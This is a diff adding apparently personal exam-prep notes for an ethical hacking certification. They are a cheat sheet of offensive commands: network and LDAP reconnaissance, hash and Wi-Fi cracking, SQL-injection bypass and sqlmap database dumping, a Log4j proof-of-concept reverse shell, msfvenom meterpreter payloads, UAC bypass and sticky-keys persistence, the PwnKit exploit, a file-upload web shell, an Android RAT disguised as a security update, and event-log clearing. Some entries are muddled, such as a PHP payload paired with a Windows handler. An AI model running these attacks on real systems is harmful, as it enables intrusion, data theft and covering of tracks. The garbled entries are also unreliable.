@@ -1,0 +1,236 @@
+Lat Longi
+Billcipher or https://hackertarget.com/geoip-ip-location-lookup/ or
+https://www.ipvoid.com/ip-geolocation/
+
+DNS Zone Transfer 
+ns axfr @ns <url> or Billcipher
+
+Host Discovery
+nmap -sn -PR <subnet>
+
+Port Scan
+nmap -p 21 <ip>
+
+Domain Controller machine (FQDN) 
+port scan 53, 88, 389, 636, 3389 and nmap -A -sV
+
+Netbios Name
+nmap -A or nbstat script or nmap -sC <ip> --top-ports=20
+
+OS discovery
+nmap -A -sV <ip>
+nmap -O -sV <ip>
+
+Ldap Enum
+enum4linux <ip>
+
+ldapsearch -h 10.10.10.25 -x -s base namingcontexts 
+(To find domain name)
+ldapsearch -h 192.168.18.110 -x -b "DC=CEH,DC=COM"
+ldapsearch -h 192.168.18.110 -x -b "DC=CEH,DC=COM" "objectclass=*"
+
+nmap <ip> --script *user*
+
+Nameservers
+Billcipher or dnsenum or nslookup -type=ns <url> or dig ns <url>
+
+NTLM 
+john --format=NT <file> --wordlist <file> or crackstation.com/geoip-ip-location-lookup/
+
+Password Audit
+L0ptcrack
+ 
+WhiteSpace Steganography
+snow.exe -C <file> -p <pass>
+
+Image Steganography
+OpenStego
+
+Covert TCP
+filter with tcp && ip.addr==<ip> or
+statistics - conversations and apply filter as a->b
+
+Bintext.exe
+File Pos and Mem Pos
+
+DIE 
+Elf files, Hash, Entropy, Entry Point Addr
+
+DHCP Starvation
+Instead of capturing traffic with Wireshark
+do sudo tcpdump -i <eth0> -v
+TxID can be found.
+
+Plain credentials
+http.request.method == POST
+
+DoS
+tcp.flags.syn == 1 and tcp.flags.ack == 1
+tcp.flags.syn == 1 and tcp.flags.ack == 0 (DDOS)
+or Analyze -> ExpertInfo (Frame undergoes connection closing)
+
+DDoS
+Conversations -> ipv4 or filter tcp.analysis.retransmission
+
+Sniffing
+Wireshark - Edit preferences - Protocal - 
+ARP/RARP - check Detect arp request stroms and 
+detect duplicate ip and click ok.
+
+HTTP-recon
+Whatweb <url> -v
+
+Banner Grabbing / ETag
+telnet <url> 80 or 443
+nc -vv <url> 80 or 443
+GET / HTTP/1.0 1.1 2.0
+
+To find files
+Owasp ZAP or curl <url> | grep -c <ext> or
+dirb <url> -X <ext>
+
+WPScan Brute
+wpscan --url <url> -U <file or UN> -p <file>
+
+Parameter Tampering
+blah' OR 1=1 -- (Login Bypass)
+
+SQL Injection
+Parameter Link + "document.cookie"
+sqlmap -u "parameter_url" --cookie="cke" --dbs
+sqlmap -u "parameter_url" --cookie="cke; ui-tabs-1=0" -D dbname --tables
+sqlmap -u "parameter_url" --cookie="cke; ui-tabs-1=0" -D dbname -T tablename --dump
+
+XSS Vuln
+Owasp ZAP or nmap -p 80 --script vuln <ip> | grep xss or
+pwnxss -u <url>
+
+Log4j Attack
+⦁	First find the ip hosting website in port 8080 using nmap.Then do further steps
+⦁	In home execute 
+⦁	tar -xf jdk-8u202-linux-x64.tar.gz
+⦁	mv jdk1.8.0_202 /usr/bin/
+⦁	cd log4j-shell-poc
+⦁	pluma poc.py
+⦁	Update the JDK Path in the Poc.py file
+⦁	Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
+⦁	Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+⦁	Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+⦁	execute this in seperate terminal [ nc -lvp 9001]
+⦁	python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
+⦁	Copy the [send this : value to be copied] from the output of previous command
+⦁	paste in username box and type any pasword in password box, click login
+⦁	Reverse shell connected in seperate terminal where nc is listening
+⦁	type cat RootFlag.txt to view answer
+⦁	(If not connect to reverse shell reload the website and check the path and try again )
+
+Severity level of attacker
+Wireshark - Analyze - ExpertInfo
+
+IOT
+mqtt and mqtt.msgtype == 3
+
+Payloads
+Normal Payload from VNC topic
+msfvenom -p windows/meterpreter/reverse_tcp 
+--platform windows -a x86 -f exe 
+LHOST=[IP Address of Host Machine] 
+LPORT=444 -o /home/attacker/Desktop/Test.exe 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp (getsystem worked)
+
+PrivEsc Payload (bypassuac_fodhelper)
+msfvenom -p windows/meterpreter/reverse_tcp 
+--platform windows -a x86 -e x86/shikata_ga_nai
+-b "\x00" lhost=[IP Address of Host Machine] -f exe 
+> /home/attacker/Desktop/Exploit.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+exploit -j -z
+background (so we can do bypassuac)
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+set payload windows/meterpreter/reverse_tcp
+same options
+exploit
+
+getsystem -t 1 (may not work sometimes)
+(run post/windows/gather/smart_hashdump)
+clearev: clears event logs but need root
+
+Exploiting Sticky Keys
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP Address of Host Machine]
+lport=4444 -f exe > /home/attacker/Desktop/Windows.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set options
+exploit
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session
+set options 
+run
+getsystem -t 1
+bg
+use post/windows/manage/sticky_keys
+sessions i*
+set session 2
+exploit
+shift key 5 times, and cmd with root
+
+pkexec for Linux or sudo -i
+whoami
+mkdir /tmp/pwnkit 
+mv CVE-2021-4034 /tmp/pwnkit
+cd /tmp/pwnkit/CVE-2021-4034
+make
+./cve-2021-4034
+
+File Upload
+msfvenom -p php/meterpreter/reverse_tcp 
+LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
+copy and paste <file>.php
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set options
+exploit
+NEXT for Medium
+just rename file to <file>.php.jpg
+and do burp proxy
+NEXT for High
+just rename file to <file>.jpg
+add first line GIF98
+upload
+then do command injection as
+|copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php
+
+Android payload
+msfvenom -p android/meterpreter/reverse_tcp --platform android
+-a dalvik lhost=[IP Address of Host Machine] R >
+Desktop/Tro.apk
+
+AndroRat
+cd AndroRat
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+
+File Download
+Certutil.exe -Urlcache -f <full_url> 
+C:\path\to\save\file\name.jpg
+
+SSH
+ssh username@<ip>
+
+Wifi Hacking
+wlan.bssid (wireshark filter)
+WPA2
+aircrack-ng -a2 -b <bssid> ./wifi_pcap.cap 
+-w ./passwords.txt
+WEP
+aircrack-ng ‘/home/wireless.cap’
+
+Android
+adb connect ip:port
+adb pull
+adb shell
+
